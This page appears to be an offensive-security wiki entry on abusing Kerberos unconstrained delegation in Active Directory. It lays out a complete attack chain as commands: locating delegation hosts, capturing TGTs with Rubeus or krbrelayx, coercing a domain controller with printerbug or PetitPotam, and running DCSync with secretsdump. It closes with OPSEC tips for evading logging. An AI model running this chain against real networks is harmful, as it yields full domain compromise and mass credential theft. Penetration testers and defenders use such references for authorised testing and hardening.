# 🔓 Unconstrained Delegation

## Theory

A host configured for **unconstrained delegation** (`TRUSTED_FOR_DELEGATION`) receives a
**forwardable TGT** from every user that authenticates to it, and **caches it in LSASS**.
Anyone who controls that host can extract those TGTs and impersonate the users.

::: details

| Aspect         | Value                                                                    |
| -------------- | ------------------------------------------------------------------------ |
| **Scope**      | Any principal that authenticates to the host - including a coerced `DC$`  |
| **Needs**      | Local admin / SYSTEM on the unconstrained host                           |
| **Trigger**   | A victim authenticating to the host (passive wait, or active coercion)   |
| **Stealth**    | Low when coercing - the coercion + the DC logon are both logged          |
| **Use when**   | You own a host flagged `TRUSTED_FOR_DELEGATION` and want a `DC$` TGT      |
| **Avoid when** | You only have the account secret (-> constrained / RBCD)                 |

:::

**Why it works** - unconstrained delegation stores the *actual TGT* (not a constrained
service ticket), so a captured TGT is reusable against **any** service in the domain. Coerce
a Domain Controller to authenticate and you capture `DC$`'s TGT, which is enough to DCSync.

> [!warning] It must be a forwardable TGT
> Only accounts whose logon forwards a TGT are captured. Accounts marked **"sensitive and
> cannot be delegated"** or in **Protected Users** are not exposed this way.

## Practice

### Requirements

::: details

| Requirement                  | How to get it                                             |
| ---------------------------- | --------------------------------------------------------- |
| Admin on an unconstrained host | Compromise a host flagged `TRUSTED_FOR_DELEGATION`       |
| A victim authentication      | Wait for a user, or **coerce** a DC (printerbug/PetitPotam) |
| Coercion creds               | Any valid domain account                                  |

:::

### Identify unconstrained hosts

```bash
impacket-findDelegation $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
nxc ldap $DC_IP -u $USER -p $PASSWORD --trusted-for-delegation
```

### Capture incoming TGTs

::: code-group

```powershell [Rubeus (Windows)]
# Watch for and dump any TGT that lands on the host - no LSASS dump on disk
Rubeus.exe monitor /interval:5 /nowrap
```

```bash [krbrelayx (Linux)]
# Listen as the unconstrained host, writing captured TGTs to .ccache
krbrelayx.py -aesKey $UNCONSTRAINED_HOST_AES_KEY
```

:::

### Coerce a DC to authenticate

```bash
# Forces DC$ to authenticate to the host we control -> its TGT is captured above
printerbug.py $DOMAIN/$USER:$PASSWORD@$DC_HOST $UNCONSTRAINED_HOST    # MS-RPRN
# or PetitPotam (MS-EFSR) when the printer bug is patched
python3 PetitPotam.py $UNCONSTRAINED_HOST $DC_HOST -u $USER -p $PASSWORD
```

### Use the captured DC TGT

```bash
export KRB5CCNAME=dc.ccache
klist                                                        # confirm the DC$ TGT

# DCSync with the machine account's TGT
impacket-secretsdump -k -no-pass -just-dc $DOMAIN/'DC$'@$DC_HOST
```

> [!tip] OPSEC
> Coercion + the DC logon are both logged - fire it once, capture, and move to DCSync
> quickly. Prefer `Rubeus monitor` over dumping LSASS: no minidump touches disk.
